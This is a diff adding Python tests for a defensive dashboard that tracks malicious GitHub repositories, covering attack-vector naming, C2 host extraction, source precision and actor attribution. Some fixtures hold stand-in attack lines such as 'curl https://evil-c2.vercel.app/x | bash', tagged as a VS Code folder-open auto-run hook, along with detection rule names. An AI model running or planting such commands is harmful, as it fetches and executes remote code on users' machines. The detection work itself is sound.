@@ -50,6 +50,54 @@ def test_summary_counts_novel_vs_osm_known(tmp_path):
     db.close()
 
 
+def test_attack_vector_and_c2_presentation(tmp_path):
+    # The dashboard must explain a finding, not dump blobs: name the attack
+    # vector, extract the attacker C2, and filter reputable installer hosts.
+    db = Database.open(tmp_path / "v.sqlite")
+    db.start_run("r1", utcnow())
+    db.upsert_finding(RepoFinding(
+        full_name="evil/lure", detection_method=DetectionMethod.MALICIOUS_OWNER,
+        status=RepoFindingStatus.CONFIRMED, score=9,
+        raw_payload={"bash_findings": [
+            # confirming rule + attacker C2, plus a LEGIT nodesource install line
+            {"file": ".vscode/tasks.json", "line": 0, "category": "install_hook",
+             "rule": "vscode-autorun",
+             "snippet": "curl https://evil-c2.vercel.app/x | bash"},
+            {"file": "Dockerfile", "line": 3, "category": "download_exec",
+             "rule": "curl-pipe-shell",
+             "snippet": "curl -fsSL https://deb.nodesource.com/setup_22.x | bash"}]}), "r1")
+    db.close()
+
+    db = Database.open(tmp_path / "v.sqlite")
+    d = queries.finding_detail(db, "evil/lure")
+    assert d["vector"] == "VS Code folder-open auto-run"
+    assert d["confirm_rule"] == "install_hook/vscode-autorun"
+    assert d["c2_hosts"] == ["evil-c2.vercel.app"]          # nodesource filtered out
+    vecs = {v["vector"]: v for v in queries.attack_vectors(db)}
+    assert vecs["VS Code folder-open auto-run"]["count"] == 1
+    c2 = queries.c2_infrastructure(db)
+    assert c2 and c2[0]["host"] == "evil-c2.vercel.app" and c2[0]["repo_count"] == 1
+    assert not any(x["host"] == "deb.nodesource.com" for x in c2)
+    db.close()
+
+
+def test_source_yield_precision_and_rejected(tmp_path):
+    db = _seed(tmp_path)
+    sy = {r["method"]: r for r in queries.source_yield(db)}
+    # signature_match: 2 confirmed, 0 rejected -> 100% precision
+    assert sy["signature_match"]["confirmed"] == 2
+    assert sy["signature_match"]["precision"] == 1.0
+    # ioc_search: 0 confirmed, 1 rejected -> 0% precision (the noisy-source signal)
+    assert sy["ioc_search"]["rejected"] == 1
+    assert sy["ioc_search"]["precision"] == 0.0
+    # worst precision sorts first
+    assert queries.source_yield(db)[0]["method"] == "ioc_search"
+    rej = queries.rejected_findings(db)
+    assert [r["full_name"] for r in rej] == ["legit/app"]
+    assert rej[0]["method"] == "ioc_search"
+    db.close()
+
+
 def test_campaign_clusters_group_by_signature_and_owner(tmp_path):
     db = _seed(tmp_path)
     c = queries.campaign_clusters(db)
@@ -115,8 +163,10 @@ def test_bad_owners_query_endpoint_and_summary_split(tmp_path):
 def test_graph_scope_and_funnel(tmp_path):
     db = _seed(tmp_path)
     g = queries.graph(db, "confirmed")
-    assert g["scope"] == "confirmed" and g["repos"] == 3       # 3 confirmed repos
-    assert queries.graph(db, "all")["repos"] == 3              # no candidate/screened in seed
+    # Graph is NOVEL-only: known/lure (OSM-known) is excluded, leaving evil/a,b.
+    assert g["scope"] == "confirmed" and g["repos"] == 2
+    assert queries.graph(db, "all")["repos"] == 2              # no candidate/screened in seed
+    # The funnel is the raw pipeline count (all confirmed), independent of the graph.
     f = queries.funnel(db)
     assert f["confirmed"] == 3 and f["rejected"] == 1 and f["candidate"] == 0
     db.close()
@@ -127,6 +177,96 @@ def test_recent_runs_marks_unfinished_as_live(tmp_path):
     rr = queries.recent_runs(db)
     assert rr["runs"][0]["run_id"] == "r1"
     assert rr["runs"][0]["live"] is True and rr["live"] is True
+    db.close()
+
+
+def test_actor_contributions_groups_by_attributed_actor(tmp_path):
+    db = Database.open(tmp_path / "act.sqlite")
+    db.start_run("r1", utcnow())
+    # A registered, corroborated actor (mirrors seed_actors.json + ingest promotion).
+    db.ensure_actor("lazarus group", "Lazarus Group", "nation_state", "r1")
+    db.upsert_finding(RepoFinding(
+        full_name="evilcorp/dropper-one", detection_method=DetectionMethod.OSM_REPOSITORY,
+        status=RepoFindingStatus.CONFIRMED, score=10, actor_key="lazarus group"), "r1")
+    db.upsert_finding(RepoFinding(
+        full_name="evilcorp/dropper-two", detection_method=DetectionMethod.NEWS_MENTION,
+        status=RepoFindingStatus.CONFIRMED, score=6, actor_key="lazarus group"), "r1")
+    # A free-text nation-level attribution with no seed_actors.json entry: the
+    # finder (_finding_from_osm_repo/_finding_from_news) must ensure_actor it
+    # FIRST, same as here, or the FK check nulls it silently on upsert.
+    db.ensure_actor("dprk (north korea)", "DPRK (North Korea)", "osm-attribution", "r1")
+    db.upsert_finding(RepoFinding(
+        full_name="other/repo", detection_method=DetectionMethod.OSM_REPOSITORY,
+        status=RepoFindingStatus.CONFIRMED, score=5, actor_key="dprk (north korea)"), "r1")
+    # A truly UNREGISTERED key (nothing called ensure_actor) must null out --
+    # the FK safety net still holds for a genuinely bad value.
+    db.upsert_finding(RepoFinding(
+        full_name="never/registered", detection_method=DetectionMethod.OSM_REPOSITORY,
+        status=RepoFindingStatus.CONFIRMED, score=3, actor_key="nonexistent-actor"), "r1")
+    # Unattributed confirmed finding must not appear at all.
+    db.upsert_finding(RepoFinding(
+        full_name="plain/finding", detection_method=DetectionMethod.SIGNATURE_MATCH,
+        status=RepoFindingStatus.CONFIRMED, score=4), "r1")
+    db.close()
+
+    db = Database.open(tmp_path / "act.sqlite")
+    actors = queries.actor_contributions(db)
+    by_key = {a["actor_key"]: a for a in actors}
+    assert by_key["lazarus group"]["label"] == "Lazarus Group"
+    assert by_key["lazarus group"]["actor_status"] == "candidate"
+    assert by_key["lazarus group"]["repo_count"] == 2
+    assert set(by_key["lazarus group"]["repos"]) == {"evilcorp/dropper-one", "evilcorp/dropper-two"}
+    assert by_key["lazarus group"]["methods"] == {"osm_repository": 1, "news_mention": 1}
+    # Pre-registered nation-level attribution survives and surfaces correctly.
+    assert by_key["dprk (north korea)"]["label"] == "DPRK (North Korea)"
+    assert by_key["dprk (north korea)"]["repo_count"] == 1
+    all_repos = {r for a in actors for r in a["repos"]}
+    assert "plain/finding" not in all_repos
+    assert "never/registered" not in all_repos   # nulled by the FK safety net
+    db.close()
+
+
+def test_graph_shows_discovered_hides_osm_repository_method(tmp_path):
+    # The graph is the DISCOVERED product: drop ONLY osm_repository (OSM's own list
+    # re-validated), NOT repos we discovered and later submitted (which then become
+    # OSM-known). Nodes also carry the evidence-based DPRK attribution.
+    db = _seed(tmp_path)
+    # A repo we discovered via owner-pivot that OSM ALSO now lists -> must still show.
+    db.upsert_artifact(MaliciousArtifact(
+        artifact_type=ArtifactType.REPO, name="ours/submitted", ecosystem="github",
+        source=FeedSource.OPEN_SOURCE_MALWARE,
+        raw_payload={"resource_identifier": "https://github.com/ours/submitted"}), "r1")
+    db.upsert_finding(RepoFinding(
+        full_name="ours/submitted", detection_method=DetectionMethod.MALICIOUS_OWNER,
+        status=RepoFindingStatus.CONFIRMED, score=7,
+        raw_payload={"bash_findings": [
+            {"file": ".vscode/tasks.json", "line": 0, "category": "install_hook",
+             "rule": "vscode-autorun", "snippet": "curl https://x.vercel.app | bash"}]}), "r1")
+    g = queries.graph(db)
+    by_id = {n["id"]: n for n in g["nodes"] if n["type"] == "repo"}
+    assert "repo:known/lure" not in by_id          # osm_repository method -> hidden
+    assert "repo:ours/submitted" in by_id          # OSM-known but OUR discovery -> shown
+    assert "repo:evil/a" in by_id and "repo:evil/b" in by_id
+    # country-level attribution rides on the node (evil/a: lone eval-atob -> possible).
+    assert by_id["repo:evil/a"]["tier"] == "possible"
+    assert by_id["repo:evil/a"]["origin"] == "North Korea"
+    assert by_id["repo:evil/a"]["attribution"]
+    db.close()
+
+
+def test_finding_detail_carries_attribution(tmp_path):
+    # The right-panel detail includes the country-level attribution. evil/a is a
+    # lone eval(atob) loader -> ONE signal -> possible, not an outright claim.
+    db = _seed(tmp_path)
+    d = queries.finding_detail(db, "evil/a")
+    assert "attribution_detail" in d
+    ad = d["attribution_detail"]
+    assert ad["origin"] == "North Korea"
+    assert ad["tier"] == "possible"
+    assert "tradecraft_vector" in ad["signals"]
+    assert ad["attributed"] is False
+    assert "dprk-consistent-tradecraft" in ad["tags"]
+    assert ad["reasons"]                                # human-readable, non-empty
     db.close()
 
 
@@ -142,6 +282,10 @@ def test_fastapi_endpoints_smoke(tmp_path):
     assert client.get("/api/graph?scope=all").json()["scope"] == "all"
     assert client.get("/api/funnel").json()["confirmed"] == 3
     assert client.get("/api/runs").json()["runs"][0]["run_id"] == "r1"
+    assert client.get("/api/actors").status_code == 200
+    tele = client.get("/api/telemetry").json()
+    assert any(r["method"] == "signature_match" for r in tele["source_yield"])
+    assert client.get("/api/rejected").json()[0]["full_name"] == "legit/app"
     assert client.get("/api/finding/evil/a").json()["novel"] is True
     assert client.get("/api/finding/nope/nope").status_code == 404
     assert client.get("/").status_code == 200  # serves the dashboard HTML
